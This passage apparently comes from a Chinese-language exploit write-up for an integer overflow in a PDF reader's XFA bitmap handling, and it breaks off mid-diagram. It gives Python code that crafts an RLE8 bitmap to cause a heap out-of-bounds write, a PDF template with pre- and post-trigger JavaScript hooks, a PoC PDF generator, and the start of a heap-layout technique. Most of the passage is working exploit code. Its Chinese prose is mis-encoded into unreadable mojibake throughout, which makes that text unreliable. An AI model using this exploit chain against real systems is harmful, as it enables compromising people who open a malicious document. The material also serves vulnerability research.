"></a>5.3 ä½å›¾æ„é€ </h3><p>å¦‚ä¸‹ Python ä»£ç å¯ä»¥ç”¨äºåˆ›å»º RLE ç±»å‹çš„ä½å›¾æ–‡ä»¶ï¼ˆå¯ä»¥æŒ‡å®šå„ç§å‚æ•°ä»¥åŠä½å›¾æ•°æ®ï¼‰ï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="comment">#-*- coding:utf-8 -*-</span></span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">import</span> struct</span><br><span class="line"></span><br><span class="line">RLE8 = <span class="number">1</span></span><br><span class="line">RLE4 = <span class="number">2</span></span><br><span class="line">COMPRESSION = RLE8</span><br><span class="line">BIT_COUNT = <span class="number">8</span></span><br><span class="line">CLR_USED = <span class="number">1</span> &lt;&lt; BIT_COUNT</span><br><span class="line">WIDTH = <span class="number">0xF0</span></span><br><span class="line">HEIGHT = <span class="number">1</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_bitmap_file_header</span><span class="params">(file_size, bits_offset)</span>:</span></span><br><span class="line">    <span class="keyword">return</span> struct.pack(<span class="string">'&lt;2sIHHI'</span>, <span class="string">'BM'</span>, file_size, <span class="number">0</span>, <span class="number">0</span>, bits_offset)</span><br><span class="line">    </span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_bitmap_info_header</span><span class="params">(data_size)</span>:</span></span><br><span class="line">    <span class="keyword">return</span> struct.pack(<span class="string">'&lt;IIIHHIIIIII'</span>,</span><br><span class="line">        <span class="number">0x00000028</span>,</span><br><span class="line">        WIDTH,</span><br><span class="line">        HEIGHT,</span><br><span class="line">        <span class="number">0x0001</span>,</span><br><span class="line">        BIT_COUNT,</span><br><span class="line">        COMPRESSION,</span><br><span class="line">        data_size,</span><br><span class="line">        <span class="number">0x00000000</span>,</span><br><span class="line">        <span class="number">0x00000000</span>,</span><br><span class="line">        CLR_USED,</span><br><span class="line">        <span class="number">0x00000000</span>)</span><br><span class="line">        </span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_bitmap_info_colors</span><span class="params">()</span>:</span></span><br><span class="line">    <span class="comment"># B, G, R, Reserved</span></span><br><span class="line">    rgb_quad = <span class="string">'\x00\x00\xFF\x00'</span></span><br><span class="line">    <span class="keyword">return</span> rgb_quad * CLR_USED</span><br><span class="line">    </span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_bitmap_data</span><span class="params">()</span>:</span></span><br><span class="line">    <span class="comment"># set ypos to 0 so that we'll be at the beginning of the heap buffer</span></span><br><span class="line">    <span class="comment"># ypos = (HEIGHT - 1) = 0, no need to bother</span></span><br><span class="line">    </span><br><span class="line">    <span class="comment"># set xpos to 0xFFFFFF00</span></span><br><span class="line">    data = <span class="string">'\x00\x02\xFF\x00'</span> * (<span class="number">0xFFFFFF00</span> / <span class="number">0xFF</span>)</span><br><span class="line">    <span class="comment"># set xpos to 0xFFFFFF0C</span></span><br><span class="line">    data += <span class="string">'\x00\x02\x0C\x00'</span></span><br><span class="line">    </span><br><span class="line">    <span class="comment"># 0xFFFFFF0C + 0xF4 = 0</span></span><br><span class="line">    <span class="comment"># 0xF4 bytes of 0x10</span></span><br><span class="line">    data += <span class="string">'\xF4\x10'</span></span><br><span class="line">    </span><br><span class="line">    <span class="comment"># mark end of bitmap to skip CxxThrowException</span></span><br><span class="line">    data += <span class="string">'\x00\x01'</span></span><br><span class="line">    </span><br><span class="line">    <span class="keyword">return</span> data</span><br><span class="line">    </span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">generate_bitmap</span><span class="params">(filepath)</span>:</span></span><br><span class="line">    data = get_bitmap_data()</span><br><span class="line">    data_size = len(data)</span><br><span class="line">    </span><br><span class="line">    bmi_header = get_bitmap_info_header(data_size)</span><br><span class="line">    bmi_colors = get_bitmap_info_colors()</span><br><span class="line">    </span><br><span class="line">    bmf_header_size = <span class="number">0x0E</span></span><br><span class="line">    bits_offset = bmf_header_size + len(bmi_header) + len(bmi_colors)</span><br><span class="line">    file_size = bits_offset + data_size</span><br><span class="line">    bmf_header = get_bitmap_file_header(file_size, bits_offset)</span><br><span class="line">    <span class="keyword">with</span> open(filepath, <span class="string">'wb'</span>) <span class="keyword">as</span> f:</span><br><span class="line">        f.write(bmf_header)</span><br><span class="line">        f.write(bmi_header)</span><br><span class="line">        f.write(bmi_colors)</span><br><span class="line">        f.write(data)</span><br><span class="line">        </span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">    <span class="keyword">if</span> len(sys.argv) != <span class="number">2</span>:</span><br><span class="line">        <span class="keyword">print</span> <span class="string">'Usage: %s &lt;output.bmp&gt;'</span> % os.path.basename(sys.argv[<span class="number">0</span>])</span><br><span class="line">        sys.exit(<span class="number">1</span>)</span><br><span class="line">    generate_bitmap(sys.argv[<span class="number">1</span>])</span><br></pre></td></tr></table></figure><p>è¿™é‡Œç›´æ¥åˆ›å»ºä¸€ä¸ª RLE8 ä½å›¾æ–‡ä»¶ï¼Œç›¸å…³å‚æ•°å¦‚ä¸‹ï¼š</p><ul><li>å®½åº¦ä¸º <code>0xF0</code> </li><li>é«˜åº¦ä¸º <code>1</code> </li><li>ä½æ•°ä¸º <code>8</code> </li></ul><p>å¯¹è¯¥ä½å›¾è€Œè¨€ï¼Œç”¨äºå­˜å‚¨ä½å›¾æ•°æ®çš„å †å—çš„å¤§å°å°†ä¼šæ˜¯ <code>0xF0</code> ï¼Œè€Œå‡½æ•° <code>get_bitmap_data</code> ä¸­æŒ‡å®šçš„ä½å›¾æ•°æ®å°†ä½¿å¾—æˆ‘ä»¬å¯ä»¥å‘ä½åœ°å€æ–¹å‘è¶Šç•Œå†™ <code>0xF4</code> å­—èŠ‚çš„æ•°æ®ï¼Œå…¶ä¸­æ•°æ®å…¨éƒ¨ä¸º <code>0x10</code> ã€‚</p><h3 id="5-4-PDF-æ„é€ "><a href="#5-4-PDF-æ„é€ " class="headerlink" title="5.4 PDF æ„é€ "></a>5.4 PDF æ„é€ </h3><p>ä¸‹é¢æ˜¯ä¸€ä¸ª PDF æ¨¡æ¿æ–‡ä»¶çš„å†…å®¹ï¼Œè¯¥æ¨¡æ¿åç»­å°†ç”¨äºç”Ÿæˆ POC æ–‡ä»¶ã€‚</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br></pre></td><td class="code"><pre><span class="line">%PDF<span class="number">-1.7</span></span><br><span class="line"><span class="number">1</span> <span class="number">0</span> obj</span><br><span class="line">&lt;&lt;</span><br><span class="line">    /Type /Catalog</span><br><span class="line">    /AcroForm <span class="number">5</span> <span class="number">0</span> R</span><br><span class="line">    /Pages <span class="number">2</span> <span class="number">0</span> R</span><br><span class="line">    /NeedsRendering <span class="literal">true</span></span><br><span class="line">    /Extensions</span><br><span class="line">    &lt;&lt;</span><br><span class="line">        /ADBE</span><br><span class="line">        &lt;&lt;</span><br><span class="line">            /ExtensionLevel <span class="number">3</span></span><br><span class="line">            /BaseVersion /<span class="number">1.7</span></span><br><span class="line">        &gt;&gt;</span><br><span class="line">    &gt;&gt;</span><br><span class="line">&gt;&gt;</span><br><span class="line">endobj</span><br><span class="line"><span class="number">2</span> <span class="number">0</span> obj</span><br><span class="line">&lt;&lt;</span><br><span class="line">    /Type /Pages</span><br><span class="line">    /Kids [<span class="number">3</span> <span class="number">0</span> R]</span><br><span class="line">    /Count <span class="number">1</span></span><br><span class="line">&gt;&gt;</span><br><span class="line">endobj</span><br><span class="line"><span class="number">3</span> <span class="number">0</span> obj</span><br><span class="line">&lt;&lt;</span><br><span class="line">    /Type /Page</span><br><span class="line">    /Parent <span class="number">2</span> <span class="number">0</span> R</span><br><span class="line">    /Contents <span class="number">4</span> <span class="number">0</span> R</span><br><span class="line">    /Resources</span><br><span class="line">    &lt;&lt;</span><br><span class="line">        /Font</span><br><span class="line">        &lt;&lt;</span><br><span class="line">            /F1</span><br><span class="line">            &lt;&lt;</span><br><span class="line">                /BaseFont /Helvetica</span><br><span class="line">                /Subtype /Type1</span><br><span class="line">                /Name /F1</span><br><span class="line">            &gt;&gt;</span><br><span class="line">        &gt;&gt;</span><br><span class="line">    &gt;&gt;</span><br><span class="line">&gt;&gt;</span><br><span class="line">endobj</span><br><span class="line"><span class="number">4</span> <span class="number">0</span> obj</span><br><span class="line">&lt;&lt;</span><br><span class="line">    /Length <span class="number">104</span></span><br><span class="line">&gt;&gt;</span><br><span class="line">stream</span><br><span class="line">BT</span><br><span class="line">/F1 <span class="number">12</span> Tf</span><br><span class="line"><span class="number">90</span> <span class="number">692</span> Td</span><br><span class="line">(If you see <span class="keyword">this</span> page, it means that your PDF reader does not support XFA.) Tj</span><br><span class="line">ET</span><br><span class="line">endstream</span><br><span class="line">endobj</span><br><span class="line"><span class="number">5</span> <span class="number">0</span> obj</span><br><span class="line">&lt;&lt;</span><br><span class="line">    /XFA <span class="number">6</span> <span class="number">0</span> R</span><br><span class="line">&gt;&gt;</span><br><span class="line">endobj</span><br><span class="line"><span class="number">6</span> <span class="number">0</span> obj</span><br><span class="line">&lt;&lt;</span><br><span class="line">    /Filter /FlateDecode</span><br><span class="line">    /Length __STREAM_LENGTH__</span><br><span class="line">&gt;&gt;</span><br><span class="line">stream</span><br><span class="line">&lt;xdp:xdp xmlns:xdp=<span class="string">"http://ns.adobe.com/xdp/"</span>&gt;</span><br><span class="line">  &lt;template xmlns:xfa=<span class="string">"http://www.xfa.org/schema/xfa-template/3.1/"</span> xmlns=<span class="string">"http://www.xfa.org/schema/xfa-template/3.0/"</span>&gt;</span><br><span class="line">    &lt;subform name=<span class="string">"form1"</span> layout=<span class="string">"tb"</span> locale=<span class="string">"en_US"</span> restoreState=<span class="string">"auto"</span>&gt;</span><br><span class="line">      &lt;pageSet&gt;</span><br><span class="line">        &lt;pageArea name=<span class="string">"Page1"</span> id=<span class="string">"Page1"</span>&gt;</span><br><span class="line">          &lt;contentArea x=<span class="string">"0.25in"</span> y=<span class="string">"0.25in"</span> w=<span class="string">"576pt"</span> h=<span class="string">"756pt"</span>/&gt;</span><br><span class="line">          &lt;medium stock=<span class="string">"default"</span> short=<span class="string">"612pt"</span> long=<span class="string">"792pt"</span>/&gt;</span><br><span class="line">        &lt;<span class="regexp">/pageArea&gt;</span></span><br><span class="line"><span class="regexp">      &lt;/</span>pageSet&gt;</span><br><span class="line">      &lt;subform w=<span class="string">"576pt"</span> h=<span class="string">"756pt"</span>&gt;</span><br><span class="line">        &lt;field name=<span class="string">"ImageCrash"</span>&gt;</span><br><span class="line">          &lt;ui&gt;</span><br><span class="line">            &lt;imageEdit/&gt;</span><br><span class="line">          &lt;<span class="regexp">/ui&gt;</span></span><br><span class="line"><span class="regexp">          &lt;value&gt;</span></span><br><span class="line"><span class="regexp">            &lt;image aspect="actual" contentType="image/</span>bmp<span class="string">"&gt;</span></span><br><span class="line"><span class="string">__IMAGE_BASE64_DATA__</span></span><br><span class="line"><span class="string">            &lt;/image&gt;</span></span><br><span class="line"><span class="string">          &lt;/value&gt;</span></span><br><span class="line"><span class="string">        &lt;/field&gt;</span></span><br><span class="line"><span class="string">      &lt;/subform&gt;</span></span><br><span class="line"><span class="string">      &lt;event activity="</span>initialize<span class="string">" name="</span>event__initialize<span class="string">"&gt;</span></span><br><span class="line"><span class="string">        &lt;script contentType="</span>application/x-javascript<span class="string">"&gt;</span></span><br><span class="line"><span class="string">// The JavaScript code will be executed before triggering the vulnerability</span></span><br><span class="line"><span class="string">        &lt;/script&gt;</span></span><br><span class="line"><span class="string">      &lt;/event&gt;</span></span><br><span class="line"><span class="string">      &lt;event activity="</span>docReady<span class="string">" ref="</span>$host<span class="string">" name="</span>event__docReady<span class="string">"&gt;</span></span><br><span class="line"><span class="string">        &lt;script contentType="</span>application/x-javascript<span class="string">"&gt;</span></span><br><span class="line"><span class="string">// The JavaScript code will be executed after triggering the vulnerability</span></span><br><span class="line"><span class="string">        &lt;/script&gt;</span></span><br><span class="line"><span class="string">      &lt;/event&gt;</span></span><br><span class="line"><span class="string">    &lt;/subform&gt;</span></span><br><span class="line"><span class="string">  &lt;/template&gt;</span></span><br><span class="line"><span class="string">  &lt;config xmlns="</span>http:<span class="comment">//www.xfa.org/schema/xci/3.0/"&gt;</span></span><br><span class="line">    &lt;agent name=<span class="string">"designer"</span>&gt;</span><br><span class="line">      &lt;!--  [<span class="number">0.</span>.n]  --&gt;</span><br><span class="line">      &lt;destination&gt;pdf&lt;<span class="regexp">/destination&gt;</span></span><br><span class="line"><span class="regexp">      &lt;pdf&gt;</span></span><br><span class="line"><span class="regexp">        &lt;!--  [0..n]  --&gt;</span></span><br><span class="line"><span class="regexp">        &lt;fontInfo/</span>&gt;</span><br><span class="line">      &lt;<span class="regexp">/pdf&gt;</span></span><br><span class="line"><span class="regexp">    &lt;/</span>agent&gt;</span><br><span class="line">    &lt;present&gt;</span><br><span class="line">      &lt;!--  [<span class="number">0.</span>.n]  --&gt;</span><br><span class="line">      &lt;pdf&gt;</span><br><span class="line">        &lt;!--  [<span class="number">0.</span>.n]  --&gt;</span><br><span class="line">        &lt;version&gt;<span class="number">1.7</span>&lt;<span class="regexp">/version&gt;</span></span><br><span class="line"><span class="regexp">        &lt;adobeExtensionLevel&gt;5&lt;/</span>adobeExtensionLevel&gt;</span><br><span class="line">      &lt;<span class="regexp">/pdf&gt;</span></span><br><span class="line"><span class="regexp">      &lt;common/</span>&gt;</span><br><span class="line">      &lt;xdp&gt;</span><br><span class="line">        &lt;packets&gt;*<span class="xml"><span class="tag">&lt;/<span class="name">packets</span>&gt;</span></span></span><br><span class="line">      &lt;<span class="regexp">/xdp&gt;</span></span><br><span class="line"><span class="regexp">    &lt;/</span>present&gt;</span><br><span class="line">  &lt;<span class="regexp">/config&gt;</span></span><br><span class="line"><span class="regexp">  &lt;xfa:datasets xmlns:xfa="http:/</span><span class="regexp">/www.xfa.org/</span>schema/xfa-data/<span class="number">1.0</span>/<span class="string">"&gt;</span></span><br><span class="line"><span class="string">    &lt;xfa:data xfa:dataNode="</span>dataGroup<span class="string">"/&gt;</span></span><br><span class="line"><span class="string">  &lt;/xfa:datasets&gt;</span></span><br><span class="line"><span class="string">  &lt;xfdf xmlns="</span>http:<span class="comment">//ns.adobe.com/xfdf/" xml:space="preserve"&gt;</span></span><br><span class="line">    &lt;annots/&gt;</span><br><span class="line">  &lt;<span class="regexp">/xfdf&gt;</span></span><br><span class="line"><span class="regexp">&lt;/</span>xdp:xdp&gt;</span><br><span class="line">endstream</span><br><span class="line">endobj</span><br><span class="line">xref</span><br><span class="line"><span class="number">0</span> <span class="number">7</span></span><br><span class="line"><span class="number">0000000000</span> <span class="number">65535</span> f </span><br><span class="line"><span class="number">0000000009</span> <span class="number">00000</span> n </span><br><span class="line"><span class="number">0000000237</span> <span class="number">00000</span> n </span><br><span class="line"><span class="number">0000000306</span> <span class="number">00000</span> n </span><br><span class="line"><span class="number">0000000587</span> <span class="number">00000</span> n </span><br><span class="line"><span class="number">0000000746</span> <span class="number">00000</span> n </span><br><span class="line"><span class="number">0000000782</span> <span class="number">00000</span> n </span><br><span class="line">trailer</span><br><span class="line">&lt;&lt;</span><br><span class="line">    /Root <span class="number">1</span> <span class="number">0</span> R</span><br><span class="line">    /Size <span class="number">7</span></span><br><span class="line">&gt;&gt;</span><br><span class="line">startxref</span><br><span class="line">__XREF_OFFSET__</span><br><span class="line">%%EOF</span><br></pre></td></tr></table></figure><p>ä¸ºäº†è§¦å‘æ•´æ•°æº¢å‡ºï¼Œå‰é¢æ„é€ çš„ä½å›¾æ–‡ä»¶çš„å¤§å°å°†è¶…è¿‡ <code>60MB</code> ï¼Œè€Œä¸”åœ¨åµŒå…¥ XFA è¡¨å•æ—¶ï¼Œéœ€è¦å¯¹å…¶è¿›è¡Œ Base64 ç¼–ç ï¼Œè¿™ä¼šä½¿å¾—ç”Ÿæˆçš„ PDF æ–‡ä»¶ç›¸å½“å¤§ã€‚ä¸ºäº†å‹ç¼© PDF æ–‡ä»¶çš„å¤§å°ï¼Œå¯ä»¥ç»™å¯¹è±¡ <code>6 0 obj</code> æŒ‡å®šä¸€ä¸ª <code>Filter</code> ï¼ˆè¿™é‡Œä¸º <code>FlateDecode</code> ï¼‰ä»¥ä¾¿å‹ç¼©å¯¹è±¡çš„æ•°æ®ï¼Œå› ä¸ºæ•°æ®æ¯”è¾ƒè§„å¾‹ï¼Œæ‰€ä»¥å‹ç¼©ç‡è¿˜æ˜¯ç›¸å½“å¯è§‚çš„ã€‚</p><p>ä¸ºäº†å®ç°æ¼æ´åˆ©ç”¨ï¼Œéœ€è¦åœ¨è§¦å‘æ¼æ´å‰å®Œæˆå†…å­˜å¸ƒå±€ã€åœ¨è§¦å‘æ¼æ´åå®Œæˆåç»­åˆ©ç”¨æ­¥éª¤ï¼Œè€Œè¿™äº›æ“ä½œéƒ½éœ€è¦å€ŸåŠ©æ‰§è¡Œ JavaScript ä»£ç æ¥å®Œæˆï¼Œå› æ­¤éœ€è¦åœ¨ä¸åŒçš„æ—¶é—´ç‚¹æ‰§è¡Œä¸åŒçš„ JavaScript ä»£ç ï¼Œè¿™å¯ä»¥é€šè¿‡ç»™ <code>subform</code> çš„ <code>initialize</code> äº‹ä»¶å’Œ <code>docReady</code> äº‹ä»¶è®¾ç½®äº‹ä»¶å¤„ç†ä»£ç æ¥å®Œæˆã€‚</p><p>ä¸‹é¢çš„ Python ä»£ç å¯ä»¥ç”¨äºç”Ÿæˆ PDF æ–‡ä»¶ï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="comment">#-*- coding:utf-8 -*-</span></span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">import</span> zlib</span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">parse_template</span><span class="params">(template_path)</span>:</span></span><br><span class="line">    <span class="keyword">with</span> open(template_path, <span class="string">'rb'</span>) <span class="keyword">as</span> f:</span><br><span class="line">        data = f.read()</span><br><span class="line">    xdp_begin = data.find(<span class="string">'&lt;xdp:xdp'</span>)</span><br><span class="line">    xdp_end = data.find(<span class="string">'&lt;/xdp:xdp&gt;'</span>) + len(<span class="string">'&lt;/xdp:xdp&gt;'</span>)</span><br><span class="line">    </span><br><span class="line">    part1 = data[:xdp_begin]</span><br><span class="line">    part2 = data[xdp_begin:xdp_end]</span><br><span class="line">    part3 = data[xdp_end:]</span><br><span class="line">    <span class="keyword">return</span> part1, part2, part3</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">generate_pdf</span><span class="params">(image_path, template_path, pdf_path)</span>:</span></span><br><span class="line">    pdf_part1, pdf_part2, pdf_part3 = parse_template(template_path)</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">with</span> open(image_path, <span class="string">'rb'</span>) <span class="keyword">as</span> f:</span><br><span class="line">        image_data = base64.b64encode(f.read())</span><br><span class="line">    pdf_part2 = pdf_part2.replace(<span class="string">'__IMAGE_BASE64_DATA__'</span>, image_data)</span><br><span class="line">    pdf_part2 = zlib.compress(pdf_part2)</span><br><span class="line">    </span><br><span class="line">    pdf_part1 = pdf_part1.replace(<span class="string">'__STREAM_LENGTH__'</span>, <span class="string">'%d'</span> % len(pdf_part2))</span><br><span class="line">    </span><br><span class="line">    pdf_data = pdf_part1 + pdf_part2 + pdf_part3</span><br><span class="line">    pdf_data = pdf_data.replace(<span class="string">'__XREF_OFFSET__'</span>, <span class="string">'%d'</span> % pdf_data.find(<span class="string">'xref'</span>))</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">with</span> open(pdf_path, <span class="string">'wb'</span>) <span class="keyword">as</span> f:</span><br><span class="line">        f.write(pdf_data)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">    <span class="keyword">if</span> len(sys.argv) != <span class="number">4</span>:</span><br><span class="line">        filename = os.path.basename(sys.argv[<span class="number">0</span>])</span><br><span class="line">        <span class="keyword">print</span> <span class="string">'Usage: %s &lt;input.bmp&gt; &lt;template.pdf&gt; &lt;output.pdf&gt;'</span> % filename</span><br><span class="line">        sys.exit(<span class="number">1</span>)</span><br><span class="line">    generate_pdf(sys.argv[<span class="number">1</span>], sys.argv[<span class="number">2</span>], sys.argv[<span class="number">3</span>])</span><br></pre></td></tr></table></figure><h3 id="5-5-åˆ©ç”¨æŠ€å·§"><a href="#5-5-åˆ©ç”¨æŠ€å·§" class="headerlink" title="5.5 åˆ©ç”¨æŠ€å·§"></a>5.5 åˆ©ç”¨æŠ€å·§</h3><h4 id="5-5-1-å†…å­˜å¸ƒå±€-1"><a href="#5-5-1-å†…å­˜å¸ƒå±€-1" class="headerlink" title="5.5.1 å†…å­˜å¸ƒå±€ (1)"></a>5.5.1 å†…å­˜å¸ƒå±€ (1)</h4><p>è¿™é‡Œå€ŸåŠ© <code>ArrayBuffer</code> æ¥å®Œæˆå†…å­˜å¸ƒå±€ã€‚</p><p>å› ä¸ºä½å›¾è§£æè¿‡ç¨‹ä¸­åˆ›å»ºçš„å †å—å¤§å°ä¸º <code>0xF0</code> å­—èŠ‚ï¼Œå› æ­¤ <code>ArrayBuffer</code> çš„ <code>byteLength</code> å¯ä»¥è®¾ç½®ä¸º <code>0xE0</code> ã€‚ä¸ºäº†åˆ›å»ºå†…å­˜ç©ºæ´ï¼Œå¯ä»¥å…ˆåˆ›å»ºå¤§é‡çš„ <code>ArrayBuffer</code> å¯¹è±¡ï¼Œç„¶åé—´éš”é‡Šæ”¾å…¶ä¸­çš„ä¸€åŠå¯¹è±¡ï¼Œç†æƒ³æƒ…å†µä¸‹çš„å†…å­˜å¸ƒå±€å¦‚ä¸‹ï¼š</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¬â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¬â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¬â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”</span><br><span class="line">â”‚ ArrayBuffer â”‚     Hole    â”‚ ArrayBuffer â”‚     Hole    â”‚</span><br><span class="line">â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”´â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”´â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”´â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜</span><br><span class="line">â”‚ &lt;-  0xF0 -&gt; â”‚</span><br></pre></td></tr></table></figure><p>åœ¨è§¦å‘æ¼æ´æ—¶ï¼Œä½å›¾è§£æç›¸å…³çš„å †å—ä¼šè½åˆ°å…¶ä¸­ä¸€ä¸ªç©ºæ´ä¸Šï¼š</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¬â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¬â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¬â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”</span><br><span class="line">â”‚ 